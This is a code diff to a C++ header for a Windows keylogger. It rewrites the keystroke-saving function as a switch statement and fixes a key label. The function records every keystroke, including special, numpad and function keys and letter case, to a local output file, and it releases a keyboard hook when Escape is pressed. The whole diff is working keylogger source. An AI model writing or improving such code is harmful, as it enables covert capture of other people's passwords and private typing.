@@ -1,4 +1,5 @@
 #pragma once
+#pragma warning(disable : 4996)
 #define PATH "KeyLogger_OUTFILE.txt" // path to keylogger OUTPUT file location
 #include <Windows.h>
 #include <fstream>
@@ -10,85 +11,117 @@ bool saveToFile(DWORD key)
 	FILE* OUTPUT_FILE = fopen(PATH, "a+");
 	if (OUTPUT_FILE == NULL)
 		return false;
-	else if (key == VK_ESCAPE)
+	switch (key)
 	{
+	case VK_ESCAPE:
 		UnhookWindowsHookEx(keyboardHook);
 		fprintf(OUTPUT_FILE, "%s", "\nEXIT PRESSED\n");
 		fclose(OUTPUT_FILE);
 		exit(1);
-	}
-
-	else if (key == VK_TAB) // ### SHIFT KEYS
+	case VK_TAB: // ### SHIFT KEYS
 		fprintf(OUTPUT_FILE, "%s", " [TAB]");
-	else if (key == VK_SPACE)
+		break;
+	case VK_SPACE:
 		fprintf(OUTPUT_FILE, "%s", " [SPACE]");
-	else if (key == VK_RETURN)
+		break;
+	case VK_RETURN:
 		fprintf(OUTPUT_FILE, "%s", " [ENTER]");
-	else if (key == VK_BACK)
+		break;
+	case VK_BACK:
 		fprintf(OUTPUT_FILE, "%s", " [BACKSPACE]");
-	else if (key == VK_DELETE)
+		break;
+	case VK_DELETE:
 		fprintf(OUTPUT_FILE, "%s", " [DELETE]");
-	else if (key == VK_MENU)
+		break;
+	case VK_MENU:
 		fprintf(OUTPUT_FILE, "%s", " [ALT]");
-	else if (key == VK_LCONTROL)
+		break;
+	case VK_LCONTROL:
 		fprintf(OUTPUT_FILE, "%s", " [LEFT CONTROL]");
-	else if (key == VK_RCONTROL)
-		fprintf(OUTPUT_FILE, "%s", " [LEFT CONTROL]");
-	else if (key == VK_LSHIFT)
+		break;
+	case VK_RCONTROL:
+		fprintf(OUTPUT_FILE, "%s", " [RIGHT CONTROL]");
+		break;
+	case VK_LSHIFT:
 		fprintf(OUTPUT_FILE, "%s", " [LEFT SHIFT]");
-	else if (key == VK_RSHIFT)
+		break;
+	case VK_RSHIFT:
 		fprintf(OUTPUT_FILE, "%s", " [RIGHT SHIFT]");
-	else if (key == VK_CAPITAL)
+		break;
+	case VK_CAPITAL:
 		fprintf(OUTPUT_FILE, "%s", " [CAPS LOCK]");
-	else if (key == VK_NUMPAD0) // ### NUMPAD KEYS
+		break;
+	case VK_NUMPAD0: // ### NUMPAD KEYS
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 0]");
-	else if (key == VK_NUMPAD1)
+		break;
+	case VK_NUMPAD1:
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 1]");
-	else if (key == VK_NUMPAD2)
+		break;
+	case VK_NUMPAD2:
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 2]");
-	else if (key == VK_NUMPAD3)
+		break;
+	case VK_NUMPAD3:
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 3]");
-	else if (key == VK_NUMPAD4)
+		break;
+	case VK_NUMPAD4:
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 4]");
-	else if (key == VK_NUMPAD5)
+		break;
+	case VK_NUMPAD5:
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 5]");
-	else if (key == VK_NUMPAD6)
+		break;
+	case VK_NUMPAD6:
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 6]");
-	else if (key == VK_NUMPAD7)
+		break;
+	case VK_NUMPAD7:
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 7]");
-	else if (key == VK_NUMPAD8)
+		break;
+	case VK_NUMPAD8:
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 8]");
-	else if (key == VK_NUMPAD9)
+		break;
+	case VK_NUMPAD9:
 		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 9]");
-	else if (key == VK_F1) //  ### FUNCTION KEYS
+		break;
+	case VK_F1: //  ### FUNCTION KEYS
 		fprintf(OUTPUT_FILE, "%s", " [F1]");
-	else if (key == VK_F2)
+		break;
+	case VK_F2:
 		fprintf(OUTPUT_FILE, "%s", " [F2]");
-	else if (key == VK_F3)
+		break;
+	case VK_F3:
 		fprintf(OUTPUT_FILE, "%s", " [F3]");
-	else if (key == VK_F4)
+		break;
+	case VK_F4:
 		fprintf(OUTPUT_FILE, "%s", " [F4]");
-	else if (key == VK_F5)
+		break;
+	case VK_F5:
 		fprintf(OUTPUT_FILE, "%s", " [F5]");
-	else if (key == VK_F6)
+		break;
+	case VK_F6:
 		fprintf(OUTPUT_FILE, "%s", " [F6]");
-	else if (key == VK_F7)
+		break;
+	case VK_F7:
 		fprintf(OUTPUT_FILE, "%s", " [F7]");
-	else if (key == VK_F8)
+		break;
+	case VK_F8:
 		fprintf(OUTPUT_FILE, "%s", " [F8]");
-	else if (key == VK_F9)
+		break;
+	case VK_F9:
 		fprintf(OUTPUT_FILE, "%s", " [F9]");
-	else if (key == VK_F10)
+		break;
+	case VK_F10:
 		fprintf(OUTPUT_FILE, "%s", " [F10]");
-	else if (key == VK_F11)
+		break;
+	case VK_F11:
 		fprintf(OUTPUT_FILE, "%s", " [F11]");
-	else if (key == VK_F12)
+		break;
+	case VK_F12:
 		fprintf(OUTPUT_FILE, "%s", " [F12]");
-	else
-	{
+		break;
+	default:
 		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0) // to check if the key is an uppercase letter
 			key = tolower(key);
 		fprintf(OUTPUT_FILE, "%s", &key);
+		break;
 	}
 	fclose(OUTPUT_FILE);
 	return true;
